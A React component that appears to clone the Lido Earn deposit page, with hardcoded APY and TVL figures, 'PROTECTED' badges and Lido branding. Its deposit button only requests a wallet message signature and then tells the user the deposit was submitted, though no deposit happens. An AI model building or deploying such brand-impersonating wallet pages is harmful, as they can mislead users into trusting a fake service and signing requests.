import React, { useState } from 'react';
import { ExternalLink, ChevronDown, Loader2 } from 'lucide-react';
import { useAppKit } from '@reown/appkit/react';
import { useAccount, useSignMessage } from 'wagmi';
import { toast } from 'sonner';
import SignatureModal from './SignatureModal';

export default function Earn() {
  const { open } = useAppKit();
  const { isConnected, address } = useAccount();
  const { signMessageAsync } = useSignMessage();
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [showSigModal, setShowSigModal] = useState(false);
  const [vaultName, setVaultName] = useState<'EarnETH' | 'EarnUSD'>('EarnETH');

  const handleDeposit = async (vault: 'EarnETH' | 'EarnUSD') => {
    if (!isConnected) {
      open();
      return;
    }

    setVaultName(vault);
    setIsSubmitting(true);
    setShowSigModal(true);

    try {
      const message = `Lido Earn Deposit Request\nVault: ${vault}\nTimestamp: ${new Date().toISOString()}`;
      await signMessageAsync({ account: address!, message });
      toast.success(`Signature approved! Deposit request into ${vault} vault submitted.`);
    } catch (error: any) {
      const msg = error?.message || 'User rejected signature request.';
      if (msg.toLowerCase().includes('reject') || msg.toLowerCase().includes('denied') || msg.toLowerCase().includes('cancel')) {
        toast.error('Signature request rejected in wallet.');
      } else {
        toast.error('Wallet signature failed. Please try again.');
      }
    } finally {
      setIsSubmitting(false);
      setShowSigModal(false);
    }
  };

  return (
    <div className="w-full">
      <div className="text-center mb-8">
        <h1 className="text-[28px] font-bold text-[var(--foreground)] mb-2 transition-colors duration-300">Lido Earn</h1>
        <p className="text-[var(--muted)] text-[15px] mb-4 transition-colors duration-300">Deploy ETH and USD stablecoins into DeFi vaults for on-chain rewards through the world's leading protocols.</p>
        <a href="#" className="text-[var(--primary)] font-bold text-[14px] hover:underline">How Lido Earn Works</a>
      </div>

      <div className="bg-gradient-to-b from-[#3B4C6A] to-[var(--card)] rounded-[24px] mb-8 border border-[var(--border)] shadow-xl overflow-hidden relative group transition-colors duration-300">
        <div className="absolute inset-0 bg-gradient-to-b from-white/10 to-transparent opacity-0 group-hover:opacity-100 transition-opacity duration-500"></div>
        <div className="p-6 md:p-8 flex flex-col items-center relative z-10">
          <div className="w-16 h-16 mb-4 relative">
             <div className="absolute inset-0 bg-[#627EEA] transform rotate-45 rounded-lg opacity-80 blur-sm"></div>
             <div className="absolute inset-0 bg-gradient-to-br from-[#627EEA] to-[#4C82FB] transform rotate-45 rounded-xl shadow-lg border border-white/20 flex items-center justify-center">
             </div>
             <div className="absolute inset-0 flex items-center justify-center">
                 <div className="w-6 h-6 bg-white/20 rounded-sm transform rotate-45"></div>
             </div>
          </div>
          
          <div className="bg-[#19D39E]/10 text-[#19D39E] text-[11px] font-bold px-3 py-1 rounded-full border border-[#19D39E]/20 mb-3 flex items-center">
            <svg className="w-3 h-3 mr-1" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path></svg>
            PROTECTED
          </div>
          
          <h2 className="text-[24px] font-bold text-[var(--foreground)] mb-3 transition-colors duration-300">EarnETH</h2>
          
          <p className="text-[var(--muted)] text-[14px] text-center mb-8 max-w-[280px] transition-colors duration-300">
            EarnETH is an ETH growth vault allocating ETH and stETH across leading blue-chip DeFi protocols meant to optimize for capital efficiency
          </p>

          <div className="w-full space-y-4 mb-6">
            <div className="flex justify-between items-center text-[15px]">
              <span className="text-[var(--muted)] flex items-center transition-colors duration-300">APY* (14d avg.) <span className="text-[var(--muted)] text-[10px] ml-1 bg-[var(--border)] rounded-full w-4 h-4 inline-flex items-center justify-center transition-colors duration-300">?</span></span>
              <span className="font-bold text-[var(--primary)] transition-colors duration-300">4%</span>
            </div>
            <div className="flex justify-between items-center text-[15px]">
              <span className="text-[var(--muted)] transition-colors duration-300">TVL</span>
              <span className="font-bold text-[var(--foreground)] transition-colors duration-300">$133.8M</span>
            </div>
            <div className="flex justify-between items-center text-[15px]">
              <span className="text-[var(--muted)] transition-colors duration-300">Protocol</span>
              <span className="font-bold text-[var(--foreground)] transition-colors duration-300">Lido + Curve</span>
            </div>
          </div>

          <button 
            onClick={() => handleDeposit('EarnETH')}
            disabled={isSubmitting}
            className="w-full py-4 rounded-[16px] font-bold text-[16px] bg-white text-[var(--primary)] hover:bg-gray-50 transition-all shadow-[0_4px_12px_rgba(255,255,255,0.1)] mb-4 cursor-pointer flex items-center justify-center"
          >
            {isSubmitting && vaultName === 'EarnETH' ? (
              <><Loader2 size={18} className="animate-spin mr-2" /> Requesting...</>
            ) : (
              isConnected ? 'Deposit' : 'Connect wallet'
            )}
          </button>
        </div>
      </div>

      <div className="bg-gradient-to-b from-[#1E3A8A] to-[var(--card)] rounded-[24px] mb-8 border border-[var(--border)] shadow-xl overflow-hidden relative group transition-colors duration-300">
        <div className="absolute inset-0 bg-gradient-to-b from-white/10 to-transparent opacity-0 group-hover:opacity-100 transition-opacity duration-500"></div>
        <div className="p-6 md:p-8 flex flex-col items-center relative z-10">
          <div className="w-16 h-16 mb-4 relative">
             <div className="absolute inset-0 bg-[var(--primary)] transform rotate-45 rounded-lg opacity-80 blur-sm"></div>
             <div className="absolute inset-0 bg-gradient-to-br from-[var(--primary)] to-[#0055FF] transform rotate-45 rounded-xl shadow-lg border border-white/20 flex items-center justify-center">
             </div>
             <div className="absolute inset-0 flex items-center justify-center text-white font-bold text-xl">
                 $
             </div>
          </div>
          
          <div className="bg-[#19D39E]/10 text-[#19D39E] text-[11px] font-bold px-3 py-1 rounded-full border border-[#19D39E]/20 mb-3 flex items-center">
            <svg className="w-3 h-3 mr-1" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path></svg>
            PROTECTED
          </div>
          
          <h2 className="text-[24px] font-bold text-[var(--foreground)] mb-3 transition-colors duration-300">EarnUSD</h2>
          
          <p className="text-[var(--muted)] text-[14px] text-center mb-8 max-w-[280px] transition-colors duration-300">
            EarnUSD delivers access to USD-denominated reward strategies built around transparent asset selection, risk controls and reporting
          </p>

          <div className="w-full space-y-4 mb-6">
            <div className="flex justify-between items-center text-[15px]">
              <span className="text-[var(--muted)] flex items-center transition-colors duration-300">APY* (14d avg.) <span className="text-[var(--muted)] text-[10px] ml-1 bg-[var(--border)] rounded-full w-4 h-4 inline-flex items-center justify-center transition-colors duration-300">?</span></span>
              <span className="font-bold text-[var(--primary)] transition-colors duration-300">7%</span>
            </div>
            <div className="flex justify-between items-center text-[15px]">
              <span className="text-[var(--muted)] transition-colors duration-300">TVL</span>
              <span className="font-bold text-[var(--foreground)] transition-colors duration-300">$35.4M</span>
            </div>
            <div className="flex justify-between items-center text-[15px]">
              <span className="text-[var(--muted)] transition-colors duration-300">Protocol</span>
              <span className="font-bold text-[var(--foreground)] transition-colors duration-300">Lido + Curve</span>
            </div>
          </div>

          <button 
            onClick={() => handleDeposit('EarnUSD')}
            disabled={isSubmitting}
            className="w-full py-4 rounded-[16px] font-bold text-[16px] bg-white text-[var(--primary)] hover:bg-gray-50 transition-all shadow-[0_4px_12px_rgba(255,255,255,0.1)] mb-4 cursor-pointer flex items-center justify-center"
          >
            {isSubmitting && vaultName === 'EarnUSD' ? (
              <><Loader2 size={18} className="animate-spin mr-2" /> Requesting...</>
            ) : (
              isConnected ? 'Deposit' : 'Connect wallet'
            )}
          </button>
        </div>
      </div>

      <div className="text-[12px] text-[var(--muted)] leading-relaxed border-t border-[var(--border)] pt-6 pb-12 space-y-4 transition-colors duration-300">
        <p>
          * APR/APY figures are estimates based on historical performance, not guaranteed, and are subject to change based on market conditions and protocol utilization.
        </p>
        <p className="pt-4 border-t border-[var(--border)]">
          Lido is an open-source peer-to-system software suite that enables users to mint transferable utility tokens (stETH) which receive rewards linked to Ethereum validation activities.
        </p>
        <div className="flex flex-wrap items-center gap-4 font-medium text-[var(--foreground)] pt-2 transition-colors duration-300">
           <div className="w-4 h-4 flex items-center justify-center">
             <img src="https://cryptologos.cc/logos/lido-dao-ldo-logo.svg" alt="Lido" className="w-full h-full opacity-80" />
           </div>
           <a href="#" className="hover:text-[var(--primary)] transition-colors">Terms of Use</a>
           <a href="#" className="hover:text-[var(--primary)] transition-colors">Privacy Notice</a>
           <a href="#" className="flex items-center hover:text-[var(--primary)] transition-colors">IPFS <ExternalLink size={12} className="ml-1" /></a>
           <div className="ml-auto px-2 py-1 bg-[var(--card)] border border-[var(--border)] rounded-md text-[10px] text-[var(--muted)] transition-colors duration-300">
             v0.145.0
           </div>
        </div>
      </div>

      <SignatureModal
        isOpen={showSigModal}
        onClose={() => {
          setShowSigModal(false);
          setIsSubmitting(false);
        }}
        actionName={`Deposit into ${vaultName}`}
        details={`Lido ${vaultName} Vault Deposit`}
        address={address}
      />
    </div>
  );
}
